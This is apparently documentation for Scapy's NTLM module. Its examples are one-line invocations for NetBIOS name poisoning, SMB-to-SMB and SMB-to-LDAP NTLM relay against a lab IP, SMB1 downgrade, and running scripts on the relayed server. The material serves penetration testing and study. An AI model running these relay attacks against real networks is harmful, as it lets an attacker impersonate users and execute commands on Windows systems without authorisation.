NTLM
====

Scapy provides dissection & build methods for NTLM and other Windows mechanisms.
In particular, the ``ntlm_relay`` command allows to perform some NTLM relaying attacks.

Examples
________


**Requirement: Answer to all netbios requests with the local IP**

.. code::
    netbios_announce(iface="virbr0")

**SMB <-> SMB: Perform a SMB2 relay**

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0")

.. warning::
    The legitimate client will the validity of the negotiated flags by using a signed IOCTL ``FSCTL_VALIDATE_NEGOTIATE_INFO`` which we cannot fake, therefore losing the connection.
    We however still have created an authenticated illegitimate client to the server, where we won't be performing that check, that we can use. See the case right below.

**SMB <-> SMB: Perform a SMB2 relay. Close the legitimate client & run commands on the server**

.. note::
    Setting ``ECHO`` to ``False`` on the server instantly terminates the connection once Authentication is successful.
    We set ``RUN_SCRIPT`` to ``True`` to run a script (in ``DO_RUN_SCRIPT`` in the automaton) once Authentication is successful. Note that ``REAL_HOSTNAME`` is required in this case.

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", server_kwargs={"ECHO": False}, client_kwargs={"REAL_HOSTNAME": "WIN1", "RUN_SCRIPT": True})

**SMB <-> SMB: SMB relay with force downgrade to SMB1**

.. note::
    ``server_kwargs={"REAL_HOSTNAME":"WIN1"}`` is compulsory on SMB1 if the name that you are spoofing is different from the real name. Set this to avoid getting a ``STATUS_DUPLICATE_NAME``

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, server_kwargs={"REAL_HOSTNAME":"WIN1"})

**SMB <-> SMB: SMB relay with force downgrade to SMB1 & drop NEGOEX**

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, server_kwargs={"PASS_NEGOEX": False, "REAL_HOSTNAME":"WIN1"})

**SMB <-> SMB: SMB relay with force downgrade to SMB1 & drop extended security**

This probably won't work.

.. code::
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_SMB_Client, iface="virbr0", ALLOW_SMB2=False, server_kwargs={"REAL_HOSTNAME":"WIN1"}, DROP_EXTENDED_SECURITY=True)

**SMB2 <-> LDAP: relay SMB's NTLM to an LDAP server**

.. code::
    load_layer("ldap")
    ntlm_relay(NTLM_SMB_Server, "192.168.122.156", NTLM_LDAP_Client, iface="virbr0")
